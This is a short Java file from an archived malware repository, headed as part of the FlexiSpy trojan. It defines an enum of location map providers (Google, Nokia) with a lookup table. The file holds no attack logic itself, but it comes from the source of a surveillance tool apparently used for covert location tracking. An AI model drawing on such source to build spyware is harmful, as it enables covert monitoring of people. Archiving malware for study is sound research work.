/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.events;

import java.util.HashMap;
import java.util.Map;

public enum FxLocationMapProvider {
	UNKNOWN(0),
	PROVIDER_GOOGLE(1),
	PROVIDER_NOKIA(2);
	
	
	private static final Map<Integer, FxLocationMapProvider> typesByValue = new HashMap<Integer, FxLocationMapProvider>();
    private final int number;
    
    static {
        for (FxLocationMapProvider type : FxLocationMapProvider.values()) {
            typesByValue.put(type.number, type);
        }
    }

    private FxLocationMapProvider(int value) {
        this.number = value;
    }

    public int getNumber() {
        return number;
    }
    
    public static FxLocationMapProvider forValue(int value) {
        return typesByValue.get(value);
    }
}
